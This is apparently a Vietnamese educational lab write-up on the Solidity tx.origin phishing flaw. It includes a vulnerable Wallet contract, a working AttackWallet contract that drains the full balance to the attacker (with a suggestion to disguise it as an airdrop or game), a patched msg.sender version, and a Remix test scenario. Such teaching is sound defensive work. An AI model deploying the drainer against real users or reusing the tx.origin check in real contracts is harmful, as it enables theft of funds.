# Lab 2: Tấn Công Lừa Đảo Qua Xác Thực tx.origin (Phishing Attack)

---

## 1. Giới thiệu lỗ hổng

Trong ngôn ngữ lập trình Solidity:
- `msg.sender`: Là địa chỉ của người hoặc hợp đồng thông minh **trực tiếp gọi** hàm hiện tại.
- `tx.origin`: Là tài khoản người dùng bên ngoài (Externally Owned Account - EOA) **khởi tạo giao dịch gốc** đầu tiên.

```
+-----------+                +----------------+                +------------+
|   Owner   | --(call)-----> |  AttackWallet  | --(transfer)-> |   Wallet   |
+-----------+                +----------------+                +------------+
  (EOA)                        (Hacker Contract)                 (Victim)
                                                                 
  tx.origin = Owner                                            tx.origin = Owner (Trùng khớp!)
  msg.sender = Owner           msg.sender = AttackWallet         msg.sender = AttackWallet
```

> [!CAUTION]
> **Quy tắc vàng:** Tuyệt đối **KHÔNG BAO GIỜ** sử dụng `tx.origin` để phân quyền hay xác thực ủy quyền trong Smart Contract.

---

## 2. Phân tích mã nguồn

### Hợp đồng nạn nhân: `Wallet.sol` (Chứa lỗi)
```solidity
function transfer(address payable _to, uint _amount) public {
    // LỖ HỔNG: tx.origin chỉ xác định ai khởi tạo chuỗi giao dịch ban đầu,
    // chứ không quan tâm người trực tiếp gọi là ai!
    require(tx.origin == owner, "Error: Not the owner");

    (bool sent, ) = _to.call{value: _amount}("");
    require(sent, "Failed to send Ether");
}
```

### Hợp đồng lừa đảo: `AttackWallet.sol`
```solidity
contract AttackWallet {
    Wallet wallet;
    address payable public attacker;

    constructor(address _walletAddress) {
        wallet = Wallet(_walletAddress);
        attacker = payable(msg.sender);
    }

    // Hacker ngụy trang hàm này thành một sự kiện airdrop, claim quà hoặc game
    function attack() public {
        wallet.transfer(attacker, address(wallet).balance);
    }
}
```

---

## 3. Biện pháp phòng chống: `WalletSafe.sol`

Thay thế hoàn toàn `tx.origin` bằng `msg.sender`:
```solidity
function transfer(address payable _to, uint _amount) public {
    // VÁ LỖ HỔNG: Chỉ chấp nhận cuộc gọi trực tiếp từ chính chủ sở hữu
    require(msg.sender == owner, "Error: Not the owner");

    (bool sent, ) = _to.call{value: _amount}("");
    require(sent, "Failed to send Ether");
}
```

---

## 4. Kịch bản thực nghiệm trên Remix IDE

1. **Chuẩn bị:**
   - Account 1 (Owner): Deploy `Wallet.sol` kèm nạp **3 ETH**.
   - Account 2 (Hacker): Deploy `AttackWallet.sol` truyền vào địa chỉ `Wallet.sol`.
2. **Tiến hành Phishing:**
   - Hacker dụ dỗ Owner tương tác (ví dụ qua trang web giả mạo claim token).
   - Account 1 (Owner) vô tình gọi hàm `attack()` trên `AttackWallet`.
   - **Kết quả:** `Wallet.sol` kiểm tra thấy `tx.origin == owner` (đúng là Account 1 khởi tạo), lập tức chuyển toàn bộ 3 ETH sang tài khoản của Hacker (Account 2).
3. **Kiểm tra bản vá:**
   - Account 1 deploy `WalletSafe.sol` và nạp 3 ETH.
   - Account 1 gọi lại hàm `attack()` trên `AttackWallet` trỏ tới `WalletSafe`.
   - **Kết quả:** Giao dịch bị **Revert** do `msg.sender` lúc này là địa chỉ của `AttackWallet`, không trùng với `owner`.
